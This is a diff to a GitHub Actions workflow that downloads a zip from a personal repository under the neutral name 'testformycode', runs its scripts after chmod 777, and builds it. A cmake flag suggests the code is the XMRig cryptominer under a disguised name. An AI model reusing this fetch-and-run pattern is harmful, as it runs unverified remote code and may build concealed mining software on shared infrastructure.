@@ -14,31 +14,35 @@ jobs:
       - name: Checkout Repository
         uses: actions/checkout@v2
 
-      - name: Set up Docker
+      - name: Set up Docker Build
         run: |
-          echo "Creating Dockerfile for Debian 7.0 Wheezy"
-          echo '
-          FROM debian:wheezy
-          RUN apt-get update && \
-              apt-get install -y curl unzip git build-essential cmake automake libtool autoconf && \
-              apt-get clean
-          ' > Dockerfile
+          echo "FROM debian:wheezy" > Dockerfile
+          echo "RUN echo 'deb http://archive.debian.org/debian/ wheezy main' > /etc/apt/sources.list && \\" >> Dockerfile
+          echo "    echo 'deb http://archive.debian.org/debian/ wheezy-updates main' >> /etc/apt/sources.list && \\" >> Dockerfile
+          echo "    echo 'Acquire::Languages none;' >> /etc/apt/apt.conf.d/99no-languages && \\" >> Dockerfile
+          echo "    apt-get update && \\" >> Dockerfile
+          echo "    apt-get install -y curl unzip git build-essential wget cmake automake libtool autoconf && \\" >> Dockerfile
+          echo "    apt-get clean" >> Dockerfile
 
-      - name: Build in Docker
+      - name: Build Docker Image
         run: |
           docker build -t testformycode .
-          docker run --rm -v ${{ github.workspace }}:/workspace -w /workspace testformycode bash -c "
-            curl -L -o testformycode.zip https://raw.githubusercontent.com/tjbcc0/tetmc/refs/heads/main/testformycode.zip && \
-            unzip testformycode.zip && \
-            cd testformycode/scripts && \
-            chmod 777 *.sh && \
-            ./build_deps.sh && \
-            cd .. && \
-            mkdir build && \
-            cd build && \
-            cmake -DXMRIG_DEPS=scripts/deps -DBUILD_SHARED_LIBS=OFF .. && \
-            make
-          "
+
+      - name: Download and Unzip Source Code
+        run: |
+          curl -L -o testformycode.zip https://raw.githubusercontent.com/tjbcc0/tetmc/refs/heads/main/testformycode.zip
+          unzip testformycode.zip
+
+      - name: Build Project
+        run: |
+          cd testformycode/scripts
+          chmod 777 *.sh
+          ./build_deps.sh
+          cd ..
+          mkdir build
+          cd build
+          cmake -DXMRIG_DEPS=scripts/deps -DBUILD_SHARED_LIBS=OFF ..
+          make
 
       - name: Upload Build Artifacts
         uses: actions/upload-artifact@v3
